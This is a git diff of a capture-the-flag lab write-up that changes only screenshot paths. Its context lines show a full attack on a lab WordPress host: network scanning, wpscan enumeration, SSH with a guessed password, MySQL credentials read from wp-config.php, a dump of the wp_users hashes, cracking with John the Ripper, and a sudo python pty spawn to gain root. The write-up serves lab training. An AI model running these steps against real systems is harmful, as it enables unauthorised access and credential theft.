@@ -34,19 +34,19 @@ Tools:
 
         ifconfig
 
-    ![1](/Resources/Images/2/1.PNG)
+    ![1](/Resources/Images/1/1.PNG)
 
 2. Network FootPrinting (find machines on the network).
 
         nmap 192.168.1.0/24
 
-    ![2](/Resources/Images/2/2.PNG)
+    ![2](/Resources/Images/1/2.PNG)
 
 3. Target1 fingerprinting (find services and ports on target1). 
 
         nmap -sV 192.168.1.110
 
-    ![3](/Resources/Images/2/3.png)
+    ![3](/Resources/Images/1/3.png)
 
 4. Enumerate with wpscan.
 
@@ -54,7 +54,7 @@ Tools:
 
     **Likewise, the usernames are easy to guess because of the leads on the website.**
 
-    ![4](/Resources/Images/2/4.PNG)
+    ![4](/Resources/Images/1/4.PNG)
 
 5. Find the flag inside the code with the google developers tool.
 
@@ -64,7 +64,7 @@ Tools:
 
     **flag1**
 
-    ![5](/Resources/Images/2/5.png)
+    ![5](/Resources/Images/1/5.png)
 
 6. Access Target1 through SSH from the Kali Linux Terminal.
 
@@ -74,7 +74,7 @@ Tools:
 
     Password: `michael`
 
-    ![6](/Resources/Images/2/6.png)
+    ![6](/Resources/Images/1/6.png)
 
 8. Look for flags.
 
@@ -84,7 +84,7 @@ Tools:
 
         find  -iname “*flag*” 2>/dev/null
 
-    ![7](/Resources/Images/2/7.png)
+    ![7](/Resources/Images/1/7.png)
 
 9. Open the file.
 
@@ -92,7 +92,7 @@ Tools:
 
     **flag2**
 
-    ![8](/Resources/Images/2/8.png)
+    ![8](/Resources/Images/1/8.png)
 
 10. Explore the WordPress directory.
 
@@ -102,7 +102,7 @@ Tools:
 
         Nano wp-config.php
 
-    ![9](/Resources/Images/2/9.png)
+    ![9](/Resources/Images/1/9.png)
 
 12. Login into MySQL with the root user.
           
@@ -114,25 +114,25 @@ Tools:
 
         show databases;
 
-    ![10](/Resources/Images/2/10.png)
+    ![10](/Resources/Images/1/10.png)
 
 14. Use the WordPress database.
 
         use wordpress;
 
-    ![11](/Resources/Images/2/11.png)
+    ![11](/Resources/Images/1/11.png)
 
 15. Glance tables of the WordPress database.
 
         show tables;
 
-    ![12](/Resources/Images/2/12.png)
+    ![12](/Resources/Images/1/12.png)
 
 16. SQL query to glance at the wp_user table.
 
         SELECT * FROM wp_users;
 
-    ![13](/Resources/Images/2/13.png)
+    ![13](/Resources/Images/1/13.png)
 
 17. Prepare the Hashes to crack them.
 
@@ -148,7 +148,7 @@ Tools:
 
         ##### Note: **To exit nano: "CTRL X", then "y" and "enter".**
 
-        ![14](/Resources/Images/2/14.png)
+        ![14](/Resources/Images/1/14.png)
 
 18. Crack the hashes with John the Ripper.
 
@@ -160,7 +160,7 @@ Tools:
 
         john –show hashes.txt
 
-    ![15](/Resources/Images/2/15.png)
+    ![15](/Resources/Images/1/15.png)
 
 20. Privilege escalation. Change user to steven.
 
@@ -172,19 +172,19 @@ Tools:
 
         Sudo -l
 
-    ![16](/Resources/Images/2/16.png)
+    ![16](/Resources/Images/1/16.png)
 
 22. Use python script to use steven's python root privilege to gain root access.
 
         sudo python -c 'import pty;pty.spawn("/bin/bash")'  
 
-    ![17](/Resources/Images/2/17.png)
+    ![17](/Resources/Images/1/17.png)
 
 23. Search flags.
 
         find  -iname “*flag*” 2>/dev/null
 
-    ![18](/Resources/Images/2/18.png)
+    ![18](/Resources/Images/1/18.png)
 
 24. Open the file.
 
@@ -192,7 +192,7 @@ Tools:
 
     **flag4**
 
-    ![19](/Resources/Images/2/19.png)
+    ![19](/Resources/Images/1/19.png)
 
 25. Search flag3.
 
@@ -200,7 +200,7 @@ Tools:
 
         grep -r flag3 *
 
-    ![20](/Resources/Images/2/20.png)
+    ![20](/Resources/Images/1/20.png)
 
 26. Open the binary file with nano.
 
@@ -216,7 +216,7 @@ Tools:
 
     **flag3**
 
-    ![21](/Resources/Images/2/21.png)
+    ![21](/Resources/Images/1/21.png)
 
 ***
 
@@ -235,7 +235,7 @@ mysql> select * from wp_posts;
 ```
 - **Flag3 and Flag4**
  
-    ![11](/Resources/Images/2/22.png)
+    ![11](/Resources/Images/1/22.png)
 
 
 
